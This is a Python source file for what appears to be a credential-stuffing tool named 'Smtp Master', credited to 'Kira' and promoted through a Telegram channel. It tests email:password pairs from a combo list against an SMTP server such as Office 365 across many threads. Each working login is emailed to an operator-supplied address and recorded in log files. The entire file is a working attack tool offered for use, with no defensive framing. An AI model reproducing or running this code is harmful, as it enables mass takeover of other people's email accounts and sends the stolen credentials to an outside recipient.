# https://t.me/clean_tools_net
import smtplib, threading, datetime, time
from platform import system
import requests
from time import time as timer
import os, sys
from colorama import Fore
from colorama import Style
from colorama import init
import getpass, ctypes, random, socket
init(autoreset=True)
fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT
live = 0
die = 0
try:
    os.mkdir('Master-Log')
except:
    pass

def logo():
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = '\n\n            _________________________________________________________________________\n                     __   __  _______  _______  _______  _______  ______   \n                    |  |_|  ||   _   ||       ||       ||       ||    _ |  \n                    |       ||  |_|  ||  _____||    ___||_     _||   | ||  \n                    |       ||       || |_____ |   |___   |   |  |   |_||_ \n                    |       ||       ||_____  ||    ___|  |   |  |    __  |\n                    | ||_|| ||   _   | _____| ||   |___   |   |  |   |  | |\n                    |_|   |_||__| |__||_______||_______|  |___|  |___|  |_|\n                                                      \n'
    for N, line in enumerate(x.split('\n')):
        sys.stdout.write('\x1b[1;%dm%s%s\n' % (random.choice(colors), line, clear))
        time.sleep(0.05)


def key_logo():
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = '\n\n\n                                       .--.\n                                      /.-. \'----------.\n                                      \'-\' .--"--""-"-\'\n                                       \'--\'\n                                                              \n\n\n'
    for N, line in enumerate(x.split('\n')):
        sys.stdout.write('\x1b[1;%dm%s%s\n' % (random.choice(colors), line, clear))
        time.sleep(0.05)


def cr():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass





def checker_ssl(user, passw):
    global die
    global live
    while True:

        if os.name == 'nt':
            ctypes.windll.kernel32.SetConsoleTitleW('Smtp Master Ch |By Kira |ToTal Users- {}|Live- {} |Die- {}'.format(totalnum, live, die))
        else:
            sys.stdout.write('\x1b]2;Smtp Master Ch |By Kira |ToTal Users- {}|Live- {} |Die- {}\x07'.format(totalnum, live, die))


        # ctypes.windll.kernel32.SetConsoleTitleW('Smtp Master Ch |By Kira |ToTal Users- {}|Live- {} |Die- {}'.format(totalnum, live, die))

        try:
            mailserver = smtplib.SMTP(host, port)
            mailserver.ehlo()
            mailserver.starttls()
            mailserver.login(user, passw)
            subj = 'New Rezlt | Smtp Master'
            date = datetime.datetime.now().strftime('%d/%m/%Y %H:%M')
            if '@' not in user:
                froma = user + '@Smtp-Master.com'
            else:
                froma = user
            from_addr = froma
            to_addr = str(email)
            message_text = 'Rezlt information\n[+] E-mail : {}\n[+] E-mail Password : {}\n[+] Host : {}\n[+] Port : {}\n+++++++++ | + K I R A + | +++++++++'.format(user, passw, host, port, date)
            msg = 'From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s' % (from_addr, to_addr, subj, date, message_text)
            mailserver.sendmail(from_addr, to_addr, msg)
            mailserver.quit()
            print(' {}[+] Live{} ==> {}:{}'.format(fg, sb, user, passw))
            f = open('Master-Log/Live-{}.txt'.format(host), 'a')
            f.write('LIVE => %s:%s\n' % (user, passw))
            live += 1
        except Exception as f:
            f = open('Master-Log/Die-{}.txt'.format(host), 'a')
            f.write('Die => %s:%s\n' % (user, passw))
            die += 1

        break


def checker_(user, passw):
    global die
    global live
    while True:

        if os.name == 'nt':
            ctypes.windll.kernel32.SetConsoleTitleW('Smtp Master Ch |By Kira |ToTal Users- {}|Live- {} |Die- {}'.format(totalnum, live, die))
        else:
            sys.stdout.write('\x1b]2;Smtp Master Ch |By Kira |ToTal Users- {}|Live- {} |Die- {}\x07'.format(totalnum, live, die))

        try:
            mailserver = smtplib.SMTP(host, port)
            mailserver.ehlo()
            mailserver.login(user, passw)
            subj = 'New Rezlt | Smtp Master'
            date = datetime.datetime.now().strftime('%d/%m/%Y %H:%M')
            if '@' not in user:
                froma = user + '@Smtp-Master.com'
            else:
                froma = user
            from_addr = froma
            to_addr = str(email)
            message_text = '+++++++++ Rezlt information +++++++++\n[+] E-mail : {}\n[+] E-mail Password : {}\n[+] Host : {}\n[+] Port : {}\n[+] SSL/TLS : Off\n+++++++++ Smtp Master +++++++++'.format(user, passw, host, port)
            msg = 'From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s' % (from_addr, to_addr, subj, date, message_text)
            mailserver.sendmail(from_addr, to_addr, msg)
            mailserver.quit()
            print(' {}[+] Live{} ==> {}:{}'.format(fg, sb, user, passw))
            f = open('Master-Log/Live-{}.txt'.format(host), 'a')
            f.write('LIVE => %s:%s\n' % (user, passw))
            live += 1
        except Exception as f:
            f = open('Master-Log/Die-{}.txt'.format(host), 'a')
            f.write('Die => %s:%s\n' % (user, passw))
            die += 1

        break


def thread():
    global email
    global host
    global passw
    global port
    global totalnum
    global user
    x = '\n\t\t\t\x1b[1;36m \x1b[0;m            \x1b[1;41m Smtp Master Script ! Coded By Kira Lag !\x1b[0;m   \x1b[1;36m  \x1b[0;m'
    xx = '\t\t\t\x1b[1;36m \x1b[0;m     \x1b[1;41m This tool use custom own host of smtp target like hosted : smtp.office365.com\x1b[0;m   \x1b[1;36m  \x1b[0;m'
    xxx = '\t\t\t\x1b[1;36m \x1b[0;m \x1b[1;41m combolist will target which office365 you hosted \x1b[0;m   \x1b[1;36m  \x1b[0;m'

    print(x)
    print(xx)
    print(xxx)
    host = input('{}{}\n\t\t[ ! ] Give Me The Smtp Host ! : '.format(fy, sb))
    port = input('{}{}\n\t\t[ ! ] Give Me The Smtp Port ! : '.format(fy, sb))
    ssl = input('{}{}\n\t\t[ ! ] Do U want Use SSL/TLS Or nun y/n ! : '.format(fy, sb))
    email = input('{}{}\n\t\t[ ! ] Your Email For Rezlt ! : '.format(fw, sb))
    print('\n\t\t\t{}{}[ ! ] Give Me Combo List ! : '.format(fw, sb), end='')
    txt = input()
    with open(txt, 'r', errors='ignore') as (file):
        lista = file.read().split('\n')
    totalnum = len(lista)
    print('\n\t\t{}{}[ ! ] Threads Number ! : '.format(fw, sb), end='')
    threadnum = int(input())
    print('{}{}\n\t===============[Start Check for ({}:{})]==============='.format(fy, sb, host, port))
    threads = []
    if ssl == 'n':
        for i in lista:
            try:
                user = i.split(':')[0]
                passw = i.split(':')[1]
            except:
                continue

            thread = threading.Thread(target=checker_, args=(user.strip(), passw.strip()))
            threads.append(thread)
            thread.start()
            if len(threads) == threadnum:
                for i in threads:
                    i.join()

                threads = []
                continue

        time.sleep(15)
    else:
        for i in lista:
            try:
                user = i.split(':')[0]
                passw = i.split(':')[1]
            except:
                continue

            thread = threading.Thread(target=checker_ssl, args=(user.strip(), passw.strip()))
            threads.append(thread)
            thread.start()
            if len(threads) == threadnum:
                for i in threads:
                    i.join()

                threads = []
                continue

        time.sleep(15)


def start():
    cr()
    key_logo()
    cr()
    logo()
    thread()


start()
